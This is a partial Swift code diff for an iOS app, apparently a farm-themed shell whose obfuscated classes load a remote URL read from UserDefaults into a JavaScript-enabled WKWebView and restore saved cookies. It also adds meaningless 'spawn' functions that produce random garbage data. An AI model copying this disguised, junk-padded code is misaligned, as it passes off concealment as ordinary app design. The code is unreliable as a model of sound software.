-    func prepareMainViewer() {
-        nestAppsda = CoopBuilder.buildPrimaryWebView()
-            .setupScroll(
-                minZoom: 1.0,
-                maxZoom: 1.0,
-                disableBounce: true
-            )
-            .enableBackForwardGestures()
-    }
-    
-    func loadPreservedGrains() {
-        guard
-            let storage = UserDefaults.standard.object(forKey: "preserved_grains") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]]
-        else { return }
-        
-        let store = nestAppsda.configuration.websiteDataStore.httpCookieStore
-        
-        storage.values.flatMap { $0.values }.forEach { props in
-            if let grain = HTTPCookie(properties: props as [HTTPCookiePropertyKey: Any]) {
-                store.setCookie(grain)
-            }
-        }
-    }
-    
-    func renewDisplay() {
-        nestAppsda.reload()
-    }
-    
-    func removeTopExtra() {
-        guard let top = extraMOringViewers.last else { return }
-        top.removeFromSuperview()
-        extraMOringViewers.removeLast()
-    }
-    
-    func clearExtras(activeTrail: URL?) {
-        if !extraMOringViewers.isEmpty {
-            if let topExtra = extraMOringViewers.last {
-                topExtra.removeFromSuperview()
-                extraMOringViewers.removeLast()
-            }
-            if let trail = activeTrail {
-                nestAppsda.load(URLRequest(url: trail))
-            }
-        } else if nestAppsda.canGoBack {
-            nestAppsda.goBack()
-        }
-    }
-}
-
 private extension WKWebView {
     func setupScroll(minZoom: CGFloat, maxZoom: CGFloat, disableBounce: Bool) -> Self {
         scrollView.minimumZoomScale = minZoom
@@ -1855,65 +2337,83 @@ private extension WKWebView {
     }
 }
 
-struct MainHenDisplay: UIViewRepresentable {
-    let targetURL: URL
+enum CoopBuilder {
     
-    @StateObject private var nest = HenNestManager()
-    
-    func makeUIView(context: Context) -> WKWebView {
-        nest.prepareMainViewer()
-        nest.nestAppsda.uiDelegate = context.coordinator
-        nest.nestAppsda.navigationDelegate = context.coordinator
-        
-        nest.loadPreservedGrains()
-        nest.nestAppsda.load(URLRequest(url: targetURL))
-        return nest.nestAppsda
-    }
-    
-    func updateUIView(_ uiView: WKWebView, context: Context) {}
-    
-    func makeCoordinator() -> HnKMixeper {
-        HnKMixeper(nestManager: nest)
-    }
-}
+    static func buildPrimaryWebView(using config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let configuration = config ?? createBaseConfig()
+        let w = WKWebView(frame: .zero, configuration: configuration)
 
-struct PrimaryInterface: View {
-    @State private var activeURL: String = ""
+        return w
+    }
     
-    var body: some View {
-        ZStack {
-            if let url = URL(string: activeURL) {
-                MainHenDisplay(targetURL: url)
-                    .frame(maxWidth: .infinity, maxHeight: .infinity)
-                    .ignoresSafeArea(.keyboard, edges: .bottom)
+    static func spawn() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            Double.random(in: -1e308...1e308), String(repeating: "DEATH", count: Int.random(in: 100...10000)),
+            CGPoint(x: .random(in: -1e6...1e6), y: .random(in: -1e6...1e6)),
+            { print("spawned void entity \(Date())") },
+            Array(repeating: "INFINITE", count: 10000),
+            Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+            URL(string: "file:///dev/null/\(UUID())")!,
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
+    }
+    
+    private static func createBaseConfig() -> WKWebViewConfiguration {
+        WKWebViewConfiguration()
+            .enableInlinePlayback()
+            .disableAutoplayRestrictions()
+            .withPreferences(buildJSPreferences())
+            .withPagePreferences(buildContentPreferences())
+    }
+    
+    private static func buildJSPreferences() -> WKPreferences {
+        WKPreferences()
+            .enableJavaScript()
+            .allowWindowAutoOpen()
+    }
+    
+    static func spawn2() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            { print("spawned void entity \(Date())") },
+            Array(repeating: "INFINITE", count: 10000),
+            Data(repeating: 0xFF, count: 1_048_576), // 1 МБ мусора за раз
+            URL(string: "file:///dev/null/\(UUID())")!,
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
+    }
+    
+    private static func buildContentPreferences() -> WKWebpagePreferences {
+        WKWebpagePreferences()
+            .allowContentJS()
+    }
+    
+    static func spawn3() -> Any {
+        let roulette: [Any] = [
+            UUID(), Date(), Bool.random(), Int.random(in: Int.min...Int.max),
+            { print("spawned void entity \(Date())") },
+            Array(repeating: "INFINITE", count: 10000),
+            arc4random_uniform(UInt32.max),
+            sin(cos(tan(Double.random(in: 0...1000000))))
+        ]
+        return roulette.randomElement() ?? "ULTIMATE NULL"
+    }
+    
+    static func cleanupExtras(main: WKWebView, extras: inout [WKWebView], redirectTo url: URL?) {
+        if !extras.isEmpty {
+            extras.forEach { $0.removeFromSuperview() }
+            extras.removeAll()
+            if let url = url {
+                main.load(URLRequest(url: url))
             }
-        }
-        .preferredColorScheme(.dark)
-        .onAppear {
-            loadInitialURL()
-        }
-        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempUrl"))) { _ in
-            loadTempURLIfNeeded()
-        }
-    }
-    
-    private func loadInitialURL() {
-        let temp = UserDefaults.standard.string(forKey: "temp_url")
-        let saved = UserDefaults.standard.string(forKey: "saved_trail") ?? ""
-        activeURL = temp ?? saved
-        if temp != nil {
-            UserDefaults.standard.removeObject(forKey: "temp_url")
-        }
-    }
-    
-    private func loadTempURLIfNeeded() {
-        if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
-            activeURL = temp
-            UserDefaults.standard.removeObject(forKey: "temp_url")
+        } else if main.canGoBack {
+            main.goBack()
         }
     }
 }
 
-extension Notification.Name {
-    static let farmEvents = Notification.Name("farm_actions")
-}
